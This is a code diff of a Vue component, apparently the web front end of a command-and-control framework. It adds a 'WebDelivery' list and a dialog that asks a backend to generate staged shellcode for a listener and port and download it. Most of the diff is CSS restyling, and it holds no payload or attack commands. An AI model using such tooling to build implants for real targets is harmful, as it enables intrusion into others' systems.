+      await getWebDeliveryList();
+    } else {
+      ElMessage.error(res.data?.data || '删除失败');
+    }
+  } catch (error) {
+    if (error !== 'cancel') {
+      console.error('删除WebDelivery失败:', error);
+      ElMessage.error('删除失败');
+    }
+  }
+};
+
+const openShellcodeDialog = (row: any) => {
+  selectedListener.value = row.ListenerConfig;
+  selectedPort.value = row.ListeningPort;
+  selectedFormat.format = '';
+  dialogVisible2.value = true;
+};
+
+const handleStageShellcode = async () => {
+  if (!selectedFormat.format) {
+    ElMessage.warning('请选择输出格式');
+    return;
+  }
+
+  generatinBackendTemplatecode.value = true;
+  try {
+    const res = await ClientAPI.StageShellCodeGen({
+      listener: selectedListener.value,
+      port: selectedPort.value,
+      format: selectedFormat.format
+    });
+
+    if (res.status === 200) {
+      const contentDisposition = res.headers['content-disposition'] || '';
+      const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition);
+      let fileName = matches && matches.length > 1
+          ? decodeURIComponent(matches[1].replace(/['"]/g, ''))
+          : `shellcode_${selectedListener.value}_${selectedPort.value}.${selectedFormat.format}`;
+
+      const blob = new Blob([res.data], { type: res.headers['content-type'] });
+      const downloadElement = document.createElement('a');
+      const href = window.URL.createObjectURL(blob);
+
+      downloadElement.href = href;
+      downloadElement.download = fileName;
+      document.body.appendChild(downloadElement);
+      downloadElement.click();
+      document.body.removeChild(downloadElement);
+      window.URL.revokeObjectURL(href);
+
+      ElMessage.success('Shellcode生成成功，开始下载');
+      dialogVisible2.value = false;
+    } else {
+      ElMessage.error('生成失败');
+    }
+  } catch (error) {
+    console.error('生成Shellcode失败:', error);
+    ElMessage.error('生成失败');
+  } finally {
+    generatinBackendTemplatecode.value = false;
+  }
+};
+
+const resetWebForm = () => {
+  webFormData.port = '';
+  webFormData.listener = '';
+  webFormData.os = '';
+  webFormData.arch = '';
+  webFormData.filename = '';
+  webFormData.pass = '';
+  webArchOptions.value = [];
+};
+
 // 初始化
 onMounted(() => {
-  // 默认选择第一个操作系统
   selectOS('windows');
+  getWebDeliveryList();
 });
 </script>
 
 <style scoped>
 .client-generator {
   padding: 24px;
-  background: linear-gradient(135deg, #f5f7fa 0%, #e4e7ed 100%);
+  background: var(--theme-gradient);
   min-height: calc(100vh - 60px);
 }
 
 .header-section {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 32px;
-  flex-wrap: wrap;
-  gap: 20px;
+  margin-bottom: 24px;
 }
 
 .header-content {
@@ -543,7 +1236,7 @@ onMounted(() => {
   font-size: 32px;
   font-weight: 700;
   color: #2c3e50;
-  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  background: linear-gradient(135deg, var(--theme-primary) 0%, var(--theme-dark) 100%);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
   background-clip: text;
@@ -556,64 +1249,76 @@ onMounted(() => {
   color: #7f8c8d;
 }
 
-.header-stats {
-  display: flex;
-  gap: 24px;
+/* 功能选择器 */
+.function-selector-card {
+  border-radius: 16px;
+  border: 1px solid #ebeef5;
+  margin-bottom: 24px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
 }
 
-.stat-item {
+.function-selector {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 16px;
+}
+
+.function-option {
   display: flex;
   align-items: center;
-  gap: 12px;
-  padding: 16px 24px;
-  background: white;
+  gap: 16px;
+  padding: 20px;
+  border: 2px solid #e9ecef;
   border-radius: 12px;
-  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
-  border: 1px solid #ebeef5;
+  cursor: pointer;
   transition: all 0.3s;
+  background: #f8f9fa;
 }
 
-.stat-item:hover {
+.function-option:hover {
+  border-color: var(--theme-primary);
+  background: var(--theme-light);
   transform: translateY(-2px);
-  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
 }
 
-.stat-icon {
-  width: 40px;
-  height: 40px;
-  border-radius: 10px;
+.function-selected {
+  border-color: var(--theme-primary) !important;
+  background: var(--theme-light) !important;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+}
+
+.function-icon-wrapper {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
   display: flex;
   align-items: center;
   justify-content: center;
-  font-size: 20px;
 }
 
-.platform-icon {
-  background: rgba(64, 158, 255, 0.1);
-  color: #409eff;
-}
-
-.arch-icon {
-  background: rgba(103, 194, 58, 0.1);
-  color: #67c23a;
-}
-
-.stat-info {
-  display: flex;
-  flex-direction: column;
-}
-
-.stat-value {
+.function-icon {
   font-size: 24px;
-  font-weight: 700;
-  color: #2c3e50;
-  line-height: 1;
 }
 
-.stat-label {
+.function-client { color: var(--theme-primary); }
+.function-web { color: #67c23a; }
+
+.function-info {
+  flex: 1;
+}
+
+.function-name {
+  font-size: 16px;
+  font-weight: 600;
+  color: #2c3e50;
+  margin-bottom: 4px;
+}
+
+.function-desc {
   font-size: 13px;
-  color: #7f8c8d;
-  margin-top: 4px;
+  color: #6c757d;
+  line-height: 1.4;
 }
 
 /* 配置卡片样式 */
@@ -643,7 +1348,7 @@ onMounted(() => {
 }
 
 .card-icon {
-  color: #409eff;
+  color: var(--theme-primary);
   font-size: 20px;
 }
 
@@ -695,7 +1400,7 @@ onMounted(() => {
 }
 
 .option-icon {
-  color: #409eff;
+  color: var(--theme-primary);
   font-size: 16px;
 }
 
@@ -720,8 +1425,9 @@ onMounted(() => {
 
 .os-option {
   display: flex;
+  flex-direction: column;
   align-items: center;
-  gap: 16px;
+  gap: 12px;
   padding: 20px;
   border: 2px solid #e9ecef;
   border-radius: 12px;
@@ -732,16 +1438,16 @@ onMounted(() => {
 }
 
 .os-option:hover {
-  border-color: #409eff;
-  background: rgba(64, 158, 255, 0.05);
+  border-color: var(--theme-primary);
+  background: rgba(0, 0, 0, 0.02);
   transform: translateY(-2px);
   box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
 }
 
 .os-selected {
-  border-color: #409eff !important;
-  background: rgba(64, 158, 255, 0.1) !important;
-  box-shadow: 0 4px 12px rgba(64, 158, 255, 0.2);
+  border-color: var(--theme-primary) !important;
+  background: rgba(0, 0, 0, 0.03) !important;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
 }
 
 .os-icon-wrapper {
@@ -771,7 +1477,7 @@ onMounted(() => {
 
 .os-info {
   flex: 1;
-  min-width: 0;
+  text-align: center;
 }
 
 .os-name {
@@ -787,7 +1493,10 @@ onMounted(() => {
 }
 
 .os-check {
-  color: #409eff;
+  position: absolute;
+  top: 12px;
+  right: 12px;
+  color: var(--theme-primary);
   font-size: 20px;
 }
 
@@ -796,11 +1505,12 @@ onMounted(() => {
   display: flex;
   flex-wrap: wrap;
   gap: 12px;
+  width: 100%;
 }
 
 .arch-option {
-  flex: 0 0 auto;
-  min-width: 180px;
+  flex: 1;
+  min-width: 200px;
   padding: 16px;
   border: 2px solid #e9ecef;
   border-radius: 10px;
@@ -813,8 +1523,8 @@ onMounted(() => {
 }
 
 .arch-option:hover:not(.arch-disabled) {
-  border-color: #409eff;
-  background: rgba(64, 158, 255, 0.05);
+  border-color: var(--theme-primary);
+  background: rgba(0, 0, 0, 0.02);
   transform: translateY(-2px);
   box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
 }
@@ -837,11 +1547,11 @@ onMounted(() => {
   display: flex;
   align-items: center;
   justify-content: center;
-  background: rgba(64, 158, 255, 0.1);
+  background: rgba(0, 0, 0, 0.03);
 }
 
 .arch-icon-svg {
-  color: #409eff;
+  color: var(--theme-primary);
   font-size: 20px;
 }
 
@@ -914,13 +1624,13 @@ onMounted(() => {
   border-radius: 12px;
   font-size: 16px;
   font-weight: 600;
-  box-shadow: 0 4px 12px rgba(64, 158, 255, 0.3);
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
   transition: all 0.3s;
 }
 
 .generate-btn:hover:not(:disabled) {
   transform: translateY(-2px);
-  box-shadow: 0 6px 20px rgba(64, 158, 255, 0.4);
+  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
 }
 
 .generate-btn .el-icon {
@@ -963,7 +1673,7 @@ onMounted(() => {
   box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
 }
 
-.command-card.command-type-0 { border-left: 4px solid #409eff; }
+.command-card.command-type-0 { border-left: 4px solid var(--theme-primary); }
 .command-card.command-type-1 { border-left: 4px solid #67c23a; }
 .command-card.command-type-2 { border-left: 4px solid #e6a23c; }
 .command-card.command-type-3 { border-left: 4px solid #f56c6c; }
@@ -983,7 +1693,7 @@ onMounted(() => {
 
 .type-icon {
   font-size: 18px;
-  color: #409eff;
+  color: var(--theme-primary);
 }
 
 .type-name {
@@ -998,7 +1708,7 @@ onMounted(() => {
 }
 
 .copy-btn:hover {
-  color: #409eff;
+  color: var(--theme-primary);
 }
 
 .command-content {
@@ -1022,45 +1732,496 @@ onMounted(() => {
 .command-desc {
   font-size: 12px;
   color: #6c757d;
-  line-height: 1.4;
 }
 
-/* 帮助卡片 */
-.help-card {
-  border-radius: 16px;
-  border: 1px solid #ebeef5;
-  background: rgba(64, 158, 255, 0.03);
-}
-
-.help-content {
-  display: flex;
+/* WebDelivery统计卡片 */
+.stats-cards {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
   gap: 16px;
-  padding: 20px;
+  margin-bottom: 24px;
 }
 
-.help-icon {
-  color: #409eff;
+.stat-card {
+  border-radius: 12px;
+  border: 1px solid #ebeef5;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+  transition: all 0.3s;
+  cursor: pointer;
+}
+
+.stat-card:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
+}
+
+.stat-content {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  padding: 8px 0;
+}
+
+.stat-icon {
+  width: 48px;
+  height: 48px;
+  border-radius: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
   font-size: 24px;
-  flex-shrink: 0;
-  margin-top: 4px;
 }
 
-.help-text {
+.total-icon {
+  background: rgba(0, 0, 0, 0.03);
+  color: var(--theme-primary);
+}
+
+.active-icon {
+  background: rgba(103, 194, 58, 0.1);
+  color: #67c23a;
+}
+
+.inactive-icon {
+  background: rgba(245, 108, 108, 0.1);
+  color: #f56c6c;
+}
+
+.stat-info {
   flex: 1;
 }
 
-.help-text h4 {
-  margin: 0 0 12px 0;
+.stat-value {
+  font-size: 24px;
+  font-weight: 700;
+  color: #2c3e50;
+  line-height: 1;
+}
+
+.stat-label {
+  font-size: 13px;
+  color: #7f8c8d;
+  margin-top: 4px;
+}
+
+/* 主表格 */
+.main-table-card {
+  border-radius: 16px;
+  border: 1px solid #ebeef5;
+  margin-bottom: 24px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08) !important;
+}
+
+.main-table-card :deep(.el-card__header) {
+  border-bottom: 1px solid #ebeef5;
+  padding: 20px 24px;
+  background: linear-gradient(90deg, #f8f9fa 0%, #fff 100%);
+}
+
+.table-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.table-title {
+  margin: 0;
+  font-size: 18px;
+  font-weight: 600;
+  color: var(--theme-primary);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.table-title:before {
+  content: '';
+  display: block;
+  width: 4px;
+  height: 18px;
+  background: linear-gradient(180deg, var(--theme-primary) 0%, var(--theme-dark) 100%);
+  border-radius: 2px;
+}
+
+.table-actions {
+  display: flex;
+  gap: 8px;
+}
+
+.custom-table {
+  font-size: 13px;
+}
+
+.custom-table :deep(.el-table__header-wrapper th) {
+  background: #f8f9fa;
+  font-weight: 600;
+  color: #495057;
+  border-bottom: 2px solid #e9ecef;
+}
+
+.custom-table :deep(.el-table__row:hover) {
+  background-color: #f8fafc;
+}
+
+.custom-table :deep(.el-table__row:hover td) {
+  background-color: #f8fafc !important;
+}
+
+/* 表格单元格 */
+.listener-cell {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.listener-icon {
+  color: var(--theme-primary);
   font-size: 16px;
+  flex-shrink: 0;
+}
+
+.listener-content {
+  flex: 1;
+  min-width: 0;
+}
+
+.listener-text {
+  font-family: 'Monaco', 'Consolas', monospace;
+  font-size: 13px;
+  color: #2c3e50;
+  word-break: break-all;
+}
+
+.listener-label {
+  font-size: 11px;
+  color: #7f8c8d;
+  margin-top: 2px;
+}
+
+.os-tag {
+  font-weight: 600;
+  font-size: 12px;
+  padding: 4px 12px;
+  letter-spacing: 0.5px;
+}
+
+.arch-cell {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.arch-icon {
+  color: #909399;
+  font-size: 14px;
+}
+
+.arch-text {
+  font-family: 'Monaco', 'Consolas', monospace;
+  font-weight: 500;
+}
+
+.password-cell {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.password-icon {
+  color: #e6a23c;
+  font-size: 14px;
+}
+
+.password-text {
+  font-family: 'Monaco', 'Consolas', monospace;
+  font-size: 12px;
+  color: #e6a23c;
+  font-weight: 500;
+}
+
+.port-cell {
+  display: flex;
+  align-items: center;
+}
+
+.port-tag {
+  font-family: 'Monaco', 'Consolas', monospace;
+  font-weight: 600;
+}
+
+.status-cell {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  justify-content: center;
+}
+
+.status-dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+}
+
+.status-active {
+  background: #67c23a;
+  box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.2);
+  animation: pulse 2s infinite;
+}
+
+.status-inactive {
+  background: #f56c6c;
+  box-shadow: 0 0 0 2px rgba(245, 108, 108, 0.2);
+}
+
+@keyframes pulse {
+  0%, 100% {
+    box-shadow: 0 0 0 2px rgba(103, 194, 58, 0.2);
+  }
+  50% {
+    box-shadow: 0 0 0 4px rgba(103, 194, 58, 0.1);
+  }
+}
+
+/* 操作按钮 */
+.action-buttons {
+  display: flex;
+  gap: 6px;
+}
+
+.action-btn {
+  width: 32px;
+  height: 32px;
+  padding: 0;
+  transition: all 0.3s;
+}
+
+.action-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+}
+
+.action-btn:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+
+/* 命令弹窗 */
+.command-popover {
+  border-radius: 8px;
+}
+
+.command-content {
+  padding: 4px;
+}
+
+.command-title {
+  margin: 0 0 12px 0;
+  font-size: 14px;
   font-weight: 600;
   color: #2c3e50;
 }
 
-.help-text p {
+.command-actions {
+  display: flex;
+  justify-content: flex-end;
+}
+
+/* 对话框样式 */
+.add-dialog,
+.shellcode-dialog {
+  border-radius: 16px;
+  overflow: hidden;
+}
+
+.add-dialog :deep(.el-dialog__header),
+.shellcode-dialog :deep(.el-dialog__header) {
   margin: 0;
+  padding: 0;
+}
+
+.dialog-content {
+  padding: 0 8px;
+}
+
+.config-form :deep(.el-form-item) {
+  margin-bottom: 24px;
+}
+
+.config-form :deep(.el-form-item__label) {
   font-size: 14px;
-  color: #5a5e66;
-  line-height: 1.6;
+  font-weight: 600;
+  color: #2c3e50;
+  padding-bottom: 8px;
+  display: block;
+}
+
+.row-group {
+  display: flex;
+  gap: 24px;
+  align-items: flex-start;
+}
+
+.half-width {
+  flex: 1;
+  min-width: 0;
+}
+
+.arch-select :deep(.el-input__wrapper) {
+  border-radius: 10px;
+  padding-left: 12px;
+  height: 48px;
+}
+
+.arch-option-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 0;
+}
+
+.arch-option-item .el-icon {
+  color: var(--theme-primary);
+  font-size: 16px;
+}
+
+.arch-label {
+  font-size: 14px;
+  font-weight: 500;
+  min-width: 60px;
+}
+
+.arch-desc {
+  font-size: 11px;
+  color: #909399;
+  flex: 1;
+  text-align: right;
+}
+
+/* 对话框底部 */
+.add-dialog :deep(.el-dialog__footer),
+.shellcode-dialog :deep(.el-dialog__footer) {
+  padding: 20px 24px;
+  border-top: 1px solid #ebeef5;
+}
+
+.dialog-footer {
+  display: flex;
+  justify-content: flex-end;
+  gap: 12px;
+}
+
+.dialog-footer .el-button {
+  min-width: 100px;
+  border-radius: 8px;
+  padding: 10px 24px;
+  font-weight: 500;
+}
+
+/* Shellcode对话框 */
+.shellcode-info {
+  padding: 16px;
+  background: #f8f9fa;
+  border-radius: 10px;
+  margin-bottom: 24px;
+  border: 1px solid #e9ecef;
+}
+
+.info-item {
+  display: flex;
+  align-items: center;
+  margin-bottom: 8px;
+}
+
+.info-item:last-child {
+  margin-bottom: 0;
+}
+
+.info-label {
+  font-size: 13px;
+  font-weight: 600;
+  color: #495057;
+  min-width: 60px;
+}
+
+.info-value {
+  font-size: 14px;
+  color: #2c3e50;
+  font-weight: 500;
+  font-family: 'Monaco', 'Consolas', monospace;
+}
+
+.format-form {
+  margin-top: 16px;
+}
+
+.format-grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 12px;
+}
+
+.format-option {
+  padding: 16px;
+  border: 2px solid #e9ecef;
+  border-radius: 10px;
+  cursor: pointer;
+  transition: all 0.3s;
+  background: #f8f9fa;
+  position: relative;
+}
+
+.format-option:hover {
+  border-color: var(--theme-primary);
+  background: rgba(0, 0, 0, 0.02);
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
+}
+
+.format-selected {
+  border-color: #67c23a !important;
+  background: rgba(103, 194, 58, 0.1) !important;
+  box-shadow: 0 4px 12px rgba(103, 194, 58, 0.2);
+}
+
+.format-icon {
+  width: 40px;
+  height: 40px;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: rgba(0, 0, 0, 0.03);
+  margin-bottom: 8px;
+}
+
+.format-icon-svg {
+  color: var(--theme-primary);
+  font-size: 20px;
+}
+
+.format-info {
+  flex: 1;
+}
+
+.format-name {
+  font-size: 14px;
+  font-weight: 600;
+  color: #2c3e50;
+  margin-bottom: 4px;
+}
+
+.format-desc {
+  font-size: 11px;
+  color: #6c757d;
+  line-height: 1.3;
+}
+
+.format-check {
+  position: absolute;
+  top: 12px;
+  right: 12px;
+  color: #67c23a;
+  font-size: 18px;
 }
 
 .form-hint {
@@ -1072,6 +2233,10 @@ onMounted(() => {
 
 /* 响应式设计 */
 @media (max-width: 992px) {
+  .function-selector {
+    grid-template-columns: 1fr;
+  }
+
   .os-selector {
     grid-template-columns: 1fr;
   }
@@ -1080,6 +2245,18 @@ onMounted(() => {
     grid-template-columns: repeat(2, 1fr);
   }
 
+  .stats-cards {
+    grid-template-columns: repeat(2, 1fr);
+  }
+
+  .row-group {
+    flex-direction: column;
+    gap: 16px;
+  }
+
+  .format-grid {
+    grid-template-columns: 1fr;
+  }
 }
 
 @media (max-width: 768px) {
@@ -1092,14 +2269,8 @@ onMounted(() => {
     align-items: stretch;
   }
 
-  .header-stats {
-    width: 100%;
-    justify-content: space-between;
-  }
-
-  .stat-item {
-    flex: 1;
-    justify-content: center;
+  .stats-cards {
+    grid-template-columns: 1fr;
   }
 
   .arch-grid {
@@ -1113,6 +2284,20 @@ onMounted(() => {
   .generate-btn {
     width: 100%;
   }
+
+  .os-selector {
+    flex-direction: column;
+  }
+
+  .action-buttons {
+    flex-direction: column;
+    gap: 4px;
+  }
+
+  .action-btn {
+    width: 28px;
+    height: 28px;
+  }
 }
 
 @media (max-width: 480px) {
@@ -1123,6 +2308,20 @@ onMounted(() => {
 
   .generate-password-btn {
     align-self: flex-end;
+  }
+
+  .add-dialog,
+  .shellcode-dialog {
+    width: 90vw !important;
+  }
+
+  .dialog-content {
+    padding: 0 4px;
+  }
+
+  .dialog-footer {
+    flex-wrap: wrap;
+    justify-content: center;
   }
 }
 </style>
